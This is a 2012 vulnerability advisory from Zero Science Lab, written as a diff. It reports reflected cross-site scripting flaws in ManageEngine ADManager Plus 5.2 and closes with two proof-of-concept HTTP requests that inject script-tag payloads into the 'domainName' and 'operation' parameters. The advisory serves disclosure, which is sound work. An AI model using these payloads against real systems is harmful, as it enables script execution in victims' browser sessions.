@@ -1,0 +1,46 @@
+
+ManageEngine ADManager Plus 5.2 Multiple XSS Vulnerabilities
+
+
+Vendor: Zoho Corporation Pvt. Ltd.
+Product web page: http://www.manageengine.com
+Affected version: 5.2
+
+Summary: ADManager Plus is a simple, easy-to-use Windows
+Active Directory Management and Reporting Solution that
+helps AD Administrators and Help Desk Technicians with
+their day-to-day activities.
+
+Desc: ADManager Plus suffers from multiple XSS vulnerabilities
+when parsing user input to the 'domainName' parameter in the
+'/jsp/AddDC.jsp' script via GET method and 'operation' parameter
+in the '/DomainConfig.do' script via POST method. Attackers can
+exploit these weaknesses to execute arbitrary HTML and script
+code in a user's browser session.
+
+Tested on: Microsoft Windows XP Professional SP3 (EN)
+           Apache-Coyote/1.1
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2012-5070
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2012-5070.php
+
+
+06.02.2012
+
+---
+
+#1
+
+ - GET http://localhost:8080/jsp/AddDC.jsp?domainName="><script>alert('zsl')</script> HTTP/1.1
+
+
+#2
+
+ - POST http://localhost:8080/DomainConfig.do?methodToCall=save HTTP/1.1
+
+   - DOMAIN_NAME=test&DOMAIN_CONTROLLER_NAME=testsrv&save=Add&operation="><script>alert('zsl')</script>&reset=
